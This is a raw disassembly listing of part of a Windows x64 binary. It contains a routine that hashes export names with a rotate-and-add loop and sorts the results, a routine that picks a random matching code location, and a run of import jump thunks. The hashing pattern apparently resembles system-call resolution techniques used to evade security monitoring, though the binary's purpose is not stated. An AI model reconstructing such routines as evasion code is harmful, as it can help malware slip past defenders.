   14000a221:	e8 9a fe ff ff       	call   0x14000a0c0
   14000a226:	89 e9                	mov    %ebp,%ecx
   14000a228:	89 c2                	mov    %eax,%edx
   14000a22a:	45 31 f6             	xor    %r14d,%r14d
   14000a22d:	45 31 ed             	xor    %r13d,%r13d
   14000a230:	89 74 24 28          	mov    %esi,0x28(%rsp)
   14000a234:	89 44 24 24          	mov    %eax,0x24(%rsp)
   14000a238:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000a23f:	00 
   14000a240:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000a245:	41 8b 04 04          	mov    (%r12,%rax,1),%eax
   14000a249:	4c 01 f8             	add    %r15,%rax
   14000a24c:	42 8b 2c b0          	mov    (%rax,%r14,4),%ebp
   14000a250:	41 0f b7 04 2f       	movzwl (%r15,%rbp,1),%eax
   14000a255:	39 c2                	cmp    %eax,%edx
   14000a257:	0f 85 d6 00 00 00    	jne    0x14000a333
   14000a25d:	89 4c 24 2c          	mov    %ecx,0x2c(%rsp)
   14000a261:	84 c0                	test   %al,%al
   14000a263:	74 4d                	je     0x14000a2b2
   14000a265:	4c 01 fd             	add    %r15,%rbp
   14000a268:	b9 2b 43 a0 19       	mov    $0x19a0432b,%ecx
   14000a26d:	e8 4e fe ff ff       	call   0x14000a0c0
   14000a272:	41 b9 d4 bc 5f e6    	mov    $0xe65fbcd4,%r9d
   14000a278:	ba 01 00 00 00       	mov    $0x1,%edx
   14000a27d:	45 31 c0             	xor    %r8d,%r8d
   14000a280:	44 89 c9             	mov    %r9d,%ecx
   14000a283:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000a28a:	84 00 00 00 00 00 
   14000a290:	45 0f b7 04 28       	movzwl (%r8,%rbp,1),%r8d
   14000a295:	c1 c1 18             	rol    $0x18,%ecx
   14000a298:	44 01 c9             	add    %r9d,%ecx
   14000a29b:	44 01 c1             	add    %r8d,%ecx
   14000a29e:	21 c1                	and    %eax,%ecx
   14000a2a0:	41 89 d0             	mov    %edx,%r8d
   14000a2a3:	ff c2                	inc    %edx
   14000a2a5:	42 80 7c 05 00 00    	cmpb   $0x0,0x0(%rbp,%r8,1)
   14000a2ab:	41 89 c9             	mov    %ecx,%r9d
   14000a2ae:	75 e0                	jne    0x14000a290
   14000a2b0:	eb 05                	jmp    0x14000a2b7
   14000a2b2:	b9 d4 bc 5f e6       	mov    $0xe65fbcd4,%ecx
   14000a2b7:	44 89 ed             	mov    %r13d,%ebp
   14000a2ba:	89 0c eb             	mov    %ecx,(%rbx,%rbp,8)
   14000a2bd:	b9 48 43 a0 19       	mov    $0x19a04348,%ecx
   14000a2c2:	e8 f9 fd ff ff       	call   0x14000a0c0
   14000a2c7:	89 c0                	mov    %eax,%eax
   14000a2c9:	42 8b 34 20          	mov    (%rax,%r12,1),%esi
   14000a2cd:	4c 01 fe             	add    %r15,%rsi
   14000a2d0:	b9 50 43 a0 19       	mov    $0x19a04350,%ecx
   14000a2d5:	e8 e6 fd ff ff       	call   0x14000a0c0
   14000a2da:	89 c0                	mov    %eax,%eax
   14000a2dc:	42 8b 04 20          	mov    (%rax,%r12,1),%eax
   14000a2e0:	4c 01 f8             	add    %r15,%rax
   14000a2e3:	42 0f b7 04 70       	movzwl (%rax,%r14,2),%eax
   14000a2e8:	8b 04 86             	mov    (%rsi,%rax,4),%eax
   14000a2eb:	89 44 eb 04          	mov    %eax,0x4(%rbx,%rbp,8)
   14000a2ef:	44 89 e8             	mov    %r13d,%eax
   14000a2f2:	45 85 ed             	test   %r13d,%r13d
   14000a2f5:	8b 4c 24 2c          	mov    0x2c(%rsp),%ecx
   14000a2f9:	74 2d                	je     0x14000a328
   14000a2fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000a300:	89 c1                	mov    %eax,%ecx
   14000a302:	8b 54 cb 04          	mov    0x4(%rbx,%rcx,8),%edx
   14000a306:	ff c8                	dec    %eax
   14000a308:	3b 54 c3 04          	cmp    0x4(%rbx,%rax,8),%edx
   14000a30c:	73 15                	jae    0x14000a323
   14000a30e:	48 8b 14 cb          	mov    (%rbx,%rcx,8),%rdx
   14000a312:	4c 8b 04 c3          	mov    (%rbx,%rax,8),%r8
   14000a316:	4c 89 04 cb          	mov    %r8,(%rbx,%rcx,8)
   14000a31a:	48 89 14 c3          	mov    %rdx,(%rbx,%rax,8)
   14000a31e:	48 85 c0             	test   %rax,%rax
   14000a321:	75 dd                	jne    0x14000a300
   14000a323:	41 8b 4c 24 18       	mov    0x18(%r12),%ecx
   14000a328:	41 ff c5             	inc    %r13d
   14000a32b:	8b 74 24 28          	mov    0x28(%rsp),%esi
   14000a32f:	8b 54 24 24          	mov    0x24(%rsp),%edx
   14000a333:	49 ff c6             	inc    %r14
   14000a336:	89 c8                	mov    %ecx,%eax
   14000a338:	49 39 c6             	cmp    %rax,%r14
   14000a33b:	73 09                	jae    0x14000a346
   14000a33d:	41 39 f5             	cmp    %esi,%r13d
   14000a340:	0f 82 fa fe ff ff    	jb     0x14000a240
   14000a346:	44 89 2d 1b 5f 2b 00 	mov    %r13d,0x2b5f1b(%rip)        # 0x1402c0268
   14000a34d:	45 85 ed             	test   %r13d,%r13d
   14000a350:	8b 74 24 20          	mov    0x20(%rsp),%esi
   14000a354:	0f 85 9b fd ff ff    	jne    0x14000a0f5
   14000a35a:	eb 0a                	jmp    0x14000a366
   14000a35c:	c7 05 02 5f 2b 00 00 	movl   $0x0,0x2b5f02(%rip)        # 0x1402c0268
   14000a363:	00 00 00 
   14000a366:	89 f8                	mov    %edi,%eax
   14000a368:	48 83 c4 38          	add    $0x38,%rsp
   14000a36c:	5b                   	pop    %rbx
   14000a36d:	5d                   	pop    %rbp
   14000a36e:	5f                   	pop    %rdi
   14000a36f:	5e                   	pop    %rsi
   14000a370:	41 5c                	pop    %r12
   14000a372:	41 5d                	pop    %r13
   14000a374:	41 5e                	pop    %r14
   14000a376:	41 5f                	pop    %r15
   14000a378:	c3                   	ret
   14000a379:	cc                   	int3
   14000a37a:	cc                   	int3
   14000a37b:	cc                   	int3
   14000a37c:	cc                   	int3
   14000a37d:	cc                   	int3
   14000a37e:	cc                   	int3
   14000a37f:	cc                   	int3
   14000a380:	41 57                	push   %r15
   14000a382:	41 56                	push   %r14
   14000a384:	41 55                	push   %r13
   14000a386:	41 54                	push   %r12
   14000a388:	56                   	push   %rsi
   14000a389:	57                   	push   %rdi
   14000a38a:	55                   	push   %rbp
   14000a38b:	53                   	push   %rbx
   14000a38c:	48 83 ec 38          	sub    $0x38,%rsp
   14000a390:	44 8b 3d dd 79 2b 00 	mov    0x2b79dd(%rip),%r15d        # 0x1402c1d74
   14000a397:	41 8d 47 01          	lea    0x1(%r15),%eax
   14000a39b:	89 05 d3 79 2b 00    	mov    %eax,0x2b79d3(%rip)        # 0x1402c1d74
   14000a3a1:	48 8d 44 24 24       	lea    0x24(%rsp),%rax
   14000a3a6:	42 8d 34 38          	lea    (%rax,%r15,1),%esi
   14000a3aa:	81 c6 d4 bc 5f e6    	add    $0xe65fbcd4,%esi
   14000a3b0:	89 74 24 24          	mov    %esi,0x24(%rsp)
   14000a3b4:	8b 1d d2 5d 2b 00    	mov    0x2b5dd2(%rip),%ebx        # 0x1402c018c
   14000a3ba:	83 fb ff             	cmp    $0xffffffff,%ebx
   14000a3bd:	74 13                	je     0x14000a3d2
   14000a3bf:	4c 8b 25 b2 79 2b 00 	mov    0x2b79b2(%rip),%r12        # 0x1402c1d78
   14000a3c6:	48 8b 3d a3 5e 2b 00 	mov    0x2b5ea3(%rip),%rdi        # 0x1402c0270
   14000a3cd:	e9 95 00 00 00       	jmp    0x14000a467
   14000a3d2:	b9 6c 43 a0 19       	mov    $0x19a0436c,%ecx
   14000a3d7:	e8 e4 fc ff ff       	call   0x14000a0c0
   14000a3dc:	4c 8b 25 95 79 2b 00 	mov    0x2b7995(%rip),%r12        # 0x1402c1d78
   14000a3e3:	bb ff ff ff ff       	mov    $0xffffffff,%ebx
   14000a3e8:	48 8b 3d 81 5e 2b 00 	mov    0x2b5e81(%rip),%rdi        # 0x1402c0270
   14000a3ef:	85 c0                	test   %eax,%eax
   14000a3f1:	74 74                	je     0x14000a467
   14000a3f3:	89 c5                	mov    %eax,%ebp
   14000a3f5:	4c 89 7c 24 28       	mov    %r15,0x28(%rsp)
   14000a3fa:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   14000a3ff:	44 8b 77 04          	mov    0x4(%rdi),%r14d
   14000a403:	b9 3b 43 a0 19       	mov    $0x19a0433b,%ecx
   14000a408:	e8 b3 fc ff ff       	call   0x14000a0c0
   14000a40d:	89 c7                	mov    %eax,%edi
   14000a40f:	41 89 ef             	mov    %ebp,%r15d
   14000a412:	4d 01 e6             	add    %r12,%r14
   14000a415:	45 31 ed             	xor    %r13d,%r13d
   14000a418:	eb 0e                	jmp    0x14000a428
   14000a41a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   14000a420:	49 ff c5             	inc    %r13
   14000a423:	4d 39 ef             	cmp    %r13,%r15
   14000a426:	74 35                	je     0x14000a45d
   14000a428:	43 0f b6 04 2e       	movzbl (%r14,%r13,1),%eax
   14000a42d:	39 c7                	cmp    %eax,%edi
   14000a42f:	75 ef                	jne    0x14000a420
   14000a431:	b9 2d 43 a0 19       	mov    $0x19a0432d,%ecx
   14000a436:	e8 85 fc ff ff       	call   0x14000a0c0
   14000a43b:	89 c0                	mov    %eax,%eax
   14000a43d:	4b 8d 0c 2e          	lea    (%r14,%r13,1),%rcx
   14000a441:	0f b6 2c 08          	movzbl (%rax,%rcx,1),%ebp
   14000a445:	b9 31 43 a0 19       	mov    $0x19a04331,%ecx
   14000a44a:	e8 71 fc ff ff       	call   0x14000a0c0
   14000a44f:	39 e8                	cmp    %ebp,%eax
   14000a451:	75 cd                	jne    0x14000a420
   14000a453:	44 89 2d 32 5d 2b 00 	mov    %r13d,0x2b5d32(%rip)        # 0x1402c018c
   14000a45a:	44 89 eb             	mov    %r13d,%ebx
   14000a45d:	48 8b 7c 24 30       	mov    0x30(%rsp),%rdi
   14000a462:	4c 8b 7c 24 28       	mov    0x28(%rsp),%r15
   14000a467:	b9 39 a9 b9 19       	mov    $0x19b9a939,%ecx
   14000a46c:	e8 4f fc ff ff       	call   0x14000a0c0
   14000a471:	41 89 c5             	mov    %eax,%r13d
   14000a474:	b9 8b 36 0f 56       	mov    $0x560f368b,%ecx
   14000a479:	e8 42 fc ff ff       	call   0x14000a0c0
   14000a47e:	41 89 c6             	mov    %eax,%r14d
   14000a481:	8b 05 e1 5d 2b 00    	mov    0x2b5de1(%rip),%eax        # 0x1402c0268
   14000a487:	ff c8                	dec    %eax
   14000a489:	89 44 24 30          	mov    %eax,0x30(%rsp)
   14000a48d:	48 63 eb             	movslq %ebx,%rbp
   14000a490:	b9 3b 43 a0 19       	mov    $0x19a0433b,%ecx
   14000a495:	e8 26 fc ff ff       	call   0x14000a0c0
   14000a49a:	89 c3                	mov    %eax,%ebx
   14000a49c:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   14000a4a1:	41 0f af f5          	imul   %r13d,%esi
   14000a4a5:	44 01 f6             	add    %r14d,%esi
   14000a4a8:	48 8d 44 24 24       	lea    0x24(%rsp),%rax
   14000a4ad:	41 01 c7             	add    %eax,%r15d
   14000a4b0:	41 81 c7 d5 bc 5f e6 	add    $0xe65fbcd5,%r15d
   14000a4b7:	eb 0e                	jmp    0x14000a4c7
   14000a4b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   14000a4c0:	03 74 24 28          	add    0x28(%rsp),%esi
   14000a4c4:	41 ff c7             	inc    %r15d
   14000a4c7:	44 89 7c 24 24       	mov    %r15d,0x24(%rsp)
   14000a4cc:	89 f0                	mov    %esi,%eax
   14000a4ce:	31 d2                	xor    %edx,%edx
   14000a4d0:	f7 74 24 30          	divl   0x30(%rsp)
   14000a4d4:	48 63 c2             	movslq %edx,%rax
   14000a4d7:	44 8b 74 c7 04       	mov    0x4(%rdi,%rax,8),%r14d
   14000a4dc:	4d 01 e6             	add    %r12,%r14
   14000a4df:	42 0f b6 44 35 00    	movzbl 0x0(%rbp,%r14,1),%eax
   14000a4e5:	39 c3                	cmp    %eax,%ebx
   14000a4e7:	75 d7                	jne    0x14000a4c0
   14000a4e9:	49 01 ee             	add    %rbp,%r14
   14000a4ec:	b9 2d 43 a0 19       	mov    $0x19a0432d,%ecx
   14000a4f1:	e8 ca fb ff ff       	call   0x14000a0c0
   14000a4f6:	89 c0                	mov    %eax,%eax
   14000a4f8:	49 89 fd             	mov    %rdi,%r13
   14000a4fb:	4c 89 e7             	mov    %r12,%rdi
   14000a4fe:	45 0f b6 24 06       	movzbl (%r14,%rax,1),%r12d
   14000a503:	b9 31 43 a0 19       	mov    $0x19a04331,%ecx
   14000a508:	e8 b3 fb ff ff       	call   0x14000a0c0
   14000a50d:	44 39 e0             	cmp    %r12d,%eax
   14000a510:	49 89 fc             	mov    %rdi,%r12
   14000a513:	4c 89 ef             	mov    %r13,%rdi
   14000a516:	75 a8                	jne    0x14000a4c0
   14000a518:	4c 89 f0             	mov    %r14,%rax
   14000a51b:	48 83 c4 38          	add    $0x38,%rsp
   14000a51f:	5b                   	pop    %rbx
   14000a520:	5d                   	pop    %rbp
   14000a521:	5f                   	pop    %rdi
   14000a522:	5e                   	pop    %rsi
   14000a523:	41 5c                	pop    %r12
   14000a525:	41 5d                	pop    %r13
   14000a527:	41 5e                	pop    %r14
   14000a529:	41 5f                	pop    %r15
   14000a52b:	c3                   	ret
   14000a52c:	cc                   	int3
   14000a52d:	cc                   	int3
   14000a52e:	cc                   	int3
   14000a52f:	cc                   	int3
   14000a530:	ff 25 c2 2e 00 00    	jmp    *0x2ec2(%rip)        # 0x14000d3f8
   14000a536:	cc                   	int3
   14000a537:	cc                   	int3
   14000a538:	cc                   	int3
   14000a539:	cc                   	int3
   14000a53a:	cc                   	int3
   14000a53b:	cc                   	int3
   14000a53c:	cc                   	int3
   14000a53d:	cc                   	int3
   14000a53e:	cc                   	int3
   14000a53f:	cc                   	int3
   14000a540:	ff 25 ba 2e 00 00    	jmp    *0x2eba(%rip)        # 0x14000d400
   14000a546:	cc                   	int3
   14000a547:	cc                   	int3
   14000a548:	cc                   	int3
   14000a549:	cc                   	int3
   14000a54a:	cc                   	int3
   14000a54b:	cc                   	int3
   14000a54c:	cc                   	int3
   14000a54d:	cc                   	int3
   14000a54e:	cc                   	int3
   14000a54f:	cc                   	int3
   14000a550:	ff 25 c2 2e 00 00    	jmp    *0x2ec2(%rip)        # 0x14000d418
   14000a556:	cc                   	int3
   14000a557:	cc                   	int3
   14000a558:	cc                   	int3
   14000a559:	cc                   	int3
   14000a55a:	cc                   	int3
   14000a55b:	cc                   	int3
   14000a55c:	cc                   	int3
   14000a55d:	cc                   	int3
   14000a55e:	cc                   	int3
   14000a55f:	cc                   	int3
   14000a560:	ff 25 c2 2e 00 00    	jmp    *0x2ec2(%rip)        # 0x14000d428
   14000a566:	cc                   	int3
   14000a567:	cc                   	int3
   14000a568:	cc                   	int3
   14000a569:	cc                   	int3
   14000a56a:	cc                   	int3
   14000a56b:	cc                   	int3
   14000a56c:	cc                   	int3
   14000a56d:	cc                   	int3
   14000a56e:	cc                   	int3
   14000a56f:	cc                   	int3
   14000a570:	ff 25 ba 2e 00 00    	jmp    *0x2eba(%rip)        # 0x14000d430
   14000a576:	cc                   	int3
   14000a577:	cc                   	int3
   14000a578:	cc                   	int3
   14000a579:	cc                   	int3
   14000a57a:	cc                   	int3
   14000a57b:	cc                   	int3
   14000a57c:	cc                   	int3
   14000a57d:	cc                   	int3
   14000a57e:	cc                   	int3
   14000a57f:	cc                   	int3
   14000a580:	ff 25 c2 2e 00 00    	jmp    *0x2ec2(%rip)        # 0x14000d448
   14000a586:	cc                   	int3
   14000a587:	cc                   	int3
   14000a588:	cc                   	int3
   14000a589:	cc                   	int3
   14000a58a:	cc                   	int3
   14000a58b:	cc                   	int3
   14000a58c:	cc                   	int3
   14000a58d:	cc                   	int3
   14000a58e:	cc                   	int3
   14000a58f:	cc                   	int3
   14000a590:	ff 25 ba 2e 00 00    	jmp    *0x2eba(%rip)        # 0x14000d450
   14000a596:	cc                   	int3
   14000a597:	cc                   	int3
   14000a598:	cc                   	int3
   14000a599:	cc                   	int3
   14000a59a:	cc                   	int3
   14000a59b:	cc                   	int3
   14000a59c:	cc                   	int3
   14000a59d:	cc                   	int3
   14000a59e:	cc                   	int3
   14000a59f:	cc                   	int3
   14000a5a0:	ff 25 d2 2e 00 00    	jmp    *0x2ed2(%rip)        # 0x14000d478
   14000a5a6:	cc                   	int3
   14000a5a7:	cc                   	int3
   14000a5a8:	cc                   	int3
   14000a5a9:	cc                   	int3
   14000a5aa:	cc                   	int3
   14000a5ab:	cc                   	int3
   14000a5ac:	cc                   	int3
   14000a5ad:	cc                   	int3
   14000a5ae:	cc                   	int3
   14000a5af:	cc                   	int3
   14000a5b0:	ff 25 e2 2e 00 00    	jmp    *0x2ee2(%rip)        # 0x14000d498
   14000a5b6:	cc                   	int3
   14000a5b7:	cc                   	int3
   14000a5b8:	cc                   	int3
   14000a5b9:	cc                   	int3
   14000a5ba:	cc                   	int3
   14000a5bb:	cc                   	int3
   14000a5bc:	cc                   	int3
   14000a5bd:	cc                   	int3
   14000a5be:	cc                   	int3
   14000a5bf:	cc                   	int3
   14000a5c0:	ff 25 da 2e 00 00    	jmp    *0x2eda(%rip)        # 0x14000d4a0
   14000a5c6:	cc                   	int3
   14000a5c7:	cc                   	int3
   14000a5c8:	cc                   	int3
   14000a5c9:	cc                   	int3
   14000a5ca:	cc                   	int3
   14000a5cb:	cc                   	int3
   14000a5cc:	cc                   	int3
   14000a5cd:	cc                   	int3
   14000a5ce:	cc                   	int3
   14000a5cf:	cc                   	int3
   14000a5d0:	ff 25 e2 2e 00 00    	jmp    *0x2ee2(%rip)        # 0x14000d4b8
   14000a5d6:	cc                   	int3
   14000a5d7:	cc                   	int3
   14000a5d8:	cc                   	int3
   14000a5d9:	cc                   	int3
   14000a5da:	cc                   	int3
   14000a5db:	cc                   	int3
   14000a5dc:	cc                   	int3
   14000a5dd:	cc                   	int3
   14000a5de:	cc                   	int3
   14000a5df:	cc                   	int3
   14000a5e0:	ff 25 ea 2e 00 00    	jmp    *0x2eea(%rip)        # 0x14000d4d0
   14000a5e6:	cc                   	int3
   14000a5e7:	cc                   	int3
   14000a5e8:	cc                   	int3
   14000a5e9:	cc                   	int3
   14000a5ea:	cc                   	int3
   14000a5eb:	cc                   	int3
   14000a5ec:	cc                   	int3
   14000a5ed:	cc                   	int3
   14000a5ee:	cc                   	int3
   14000a5ef:	cc                   	int3
   14000a5f0:	ff 25 e2 2e 00 00    	jmp    *0x2ee2(%rip)        # 0x14000d4d8
   14000a5f6:	cc                   	int3
   14000a5f7:	cc                   	int3
   14000a5f8:	cc                   	int3
   14000a5f9:	cc                   	int3
   14000a5fa:	cc                   	int3
   14000a5fb:	cc                   	int3
   14000a5fc:	cc                   	int3
   14000a5fd:	cc                   	int3
   14000a5fe:	cc                   	int3
   14000a5ff:	cc                   	int3
   14000a600:	ff 25 da 2e 00 00    	jmp    *0x2eda(%rip)        # 0x14000d4e0
   14000a606:	cc                   	int3
   14000a607:	cc                   	int3
   14000a608:	cc                   	int3
   14000a609:	cc                   	int3
   14000a60a:	cc                   	int3
   14000a60b:	cc                   	int3
   14000a60c:	cc                   	int3
   14000a60d:	cc                   	int3
   14000a60e:	cc                   	int3
   14000a60f:	cc                   	int3
   14000a610:	ff 25 d2 2e 00 00    	jmp    *0x2ed2(%rip)        # 0x14000d4e8
   14000a616:	cc                   	int3
   14000a617:	cc                   	int3
   14000a618:	cc                   	int3
   14000a619:	cc                   	int3
   14000a61a:	cc                   	int3
   14000a61b:	cc                   	int3
   14000a61c:	cc                   	int3
   14000a61d:	cc                   	int3
   14000a61e:	cc                   	int3
   14000a61f:	cc                   	int3
   14000a620:	ff 25 5a 2e 00 00    	jmp    *0x2e5a(%rip)        # 0x14000d480
   14000a626:	cc                   	int3
   14000a627:	cc                   	int3
   14000a628:	cc                   	int3
   14000a629:	cc                   	int3
   14000a62a:	cc                   	int3
   14000a62b:	cc                   	int3
   14000a62c:	cc                   	int3
   14000a62d:	cc                   	int3
   14000a62e:	cc                   	int3
   14000a62f:	cc                   	int3
   14000a630:	ff 25 5a 2e 00 00    	jmp    *0x2e5a(%rip)        # 0x14000d490
   14000a636:	cc                   	int3
   14000a637:	cc                   	int3
   14000a638:	cc                   	int3
   14000a639:	cc                   	int3
   14000a63a:	cc                   	int3
   14000a63b:	cc                   	int3
   14000a63c:	cc                   	int3
   14000a63d:	cc                   	int3
   14000a63e:	cc                   	int3
   14000a63f:	cc                   	int3
   14000a640:	ff 25 82 2e 00 00    	jmp    *0x2e82(%rip)        # 0x14000d4c8
   14000a646:	cc                   	int3
   14000a647:	cc                   	int3
   14000a648:	cc                   	int3
   14000a649:	cc                   	int3
   14000a64a:	cc                   	int3
   14000a64b:	cc                   	int3
   14000a64c:	cc                   	int3
   14000a64d:	cc                   	int3
   14000a64e:	cc                   	int3
   14000a64f:	cc                   	int3
   14000a650:	ff 25 12 2e 00 00    	jmp    *0x2e12(%rip)        # 0x14000d468
   14000a656:	cc                   	int3
   14000a657:	cc                   	int3
   14000a658:	cc                   	int3
   14000a659:	cc                   	int3
   14000a65a:	cc                   	int3
   14000a65b:	cc                   	int3
   14000a65c:	cc                   	int3
   14000a65d:	cc                   	int3
   14000a65e:	cc                   	int3
   14000a65f:	cc                   	int3
   14000a660:	ff 25 ba 2d 00 00    	jmp    *0x2dba(%rip)        # 0x14000d420
   14000a666:	cc                   	int3
   14000a667:	cc                   	int3
   14000a668:	cc                   	int3
   14000a669:	cc                   	int3
   14000a66a:	cc                   	int3
   14000a66b:	cc                   	int3
   14000a66c:	cc                   	int3
   14000a66d:	cc                   	int3
   14000a66e:	cc                   	int3
   14000a66f:	cc                   	int3
   14000a670:	ff 25 3a 2e 00 00    	jmp    *0x2e3a(%rip)        # 0x14000d4b0
   14000a676:	cc                   	int3
   14000a677:	cc                   	int3
   14000a678:	cc                   	int3
   14000a679:	cc                   	int3
   14000a67a:	cc                   	int3
   14000a67b:	cc                   	int3
   14000a67c:	cc                   	int3
   14000a67d:	cc                   	int3
   14000a67e:	cc                   	int3
   14000a67f:	cc                   	int3
   14000a680:	ff 25 d2 2d 00 00    	jmp    *0x2dd2(%rip)        # 0x14000d458
   14000a686:	cc                   	int3
   14000a687:	cc                   	int3
   14000a688:	cc                   	int3
   14000a689:	cc                   	int3
   14000a68a:	cc                   	int3
   14000a68b:	cc                   	int3
   14000a68c:	cc                   	int3
   14000a68d:	cc                   	int3
   14000a68e:	cc                   	int3
   14000a68f:	cc                   	int3
   14000a690:	ff 25 ca 2d 00 00    	jmp    *0x2dca(%rip)        # 0x14000d460
   14000a696:	cc                   	int3
   14000a697:	cc                   	int3
   14000a698:	cc                   	int3
   14000a699:	cc                   	int3
   14000a69a:	cc                   	int3
   14000a69b:	cc                   	int3
   14000a69c:	cc                   	int3
   14000a69d:	cc                   	int3
   14000a69e:	cc                   	int3
   14000a69f:	cc                   	int3
   14000a6a0:	ff 25 ca 2d 00 00    	jmp    *0x2dca(%rip)        # 0x14000d470
   14000a6a6:	cc                   	int3
   14000a6a7:	cc                   	int3
   14000a6a8:	cc                   	int3
   14000a6a9:	cc                   	int3
   14000a6aa:	cc                   	int3
   14000a6ab:	cc                   	int3
   14000a6ac:	cc                   	int3
   14000a6ad:	cc                   	int3
   14000a6ae:	cc                   	int3
   14000a6af:	cc                   	int3
   14000a6b0:	ff 25 d2 2d 00 00    	jmp    *0x2dd2(%rip)        # 0x14000d488
   14000a6b6:	cc                   	int3
   14000a6b7:	cc                   	int3
   14000a6b8:	cc                   	int3
   14000a6b9:	cc                   	int3
   14000a6ba:	cc                   	int3
   14000a6bb:	cc                   	int3
   14000a6bc:	cc                   	int3
   14000a6bd:	cc                   	int3
   14000a6be:	cc                   	int3
   14000a6bf:	cc                   	int3
   14000a6c0:	ff 25 4a 2d 00 00    	jmp    *0x2d4a(%rip)        # 0x14000d410
   14000a6c6:	cc                   	int3
   14000a6c7:	cc                   	int3
   14000a6c8:	cc                   	int3
   14000a6c9:	cc                   	int3
   14000a6ca:	cc                   	int3
   14000a6cb:	cc                   	int3
   14000a6cc:	cc                   	int3
   14000a6cd:	cc                   	int3
   14000a6ce:	cc                   	int3
   14000a6cf:	cc                   	int3
   14000a6d0:	ff 25 ea 2d 00 00    	jmp    *0x2dea(%rip)        # 0x14000d4c0
   14000a6d6:	cc                   	int3
   14000a6d7:	cc                   	int3
   14000a6d8:	cc                   	int3
   14000a6d9:	cc                   	int3
   14000a6da:	cc                   	int3
   14000a6db:	cc                   	int3
   14000a6dc:	cc                   	int3
   14000a6dd:	cc                   	int3
   14000a6de:	cc                   	int3
   14000a6df:	cc                   	int3
   14000a6e0:	ff 25 c2 2d 00 00    	jmp    *0x2dc2(%rip)        # 0x14000d4a8
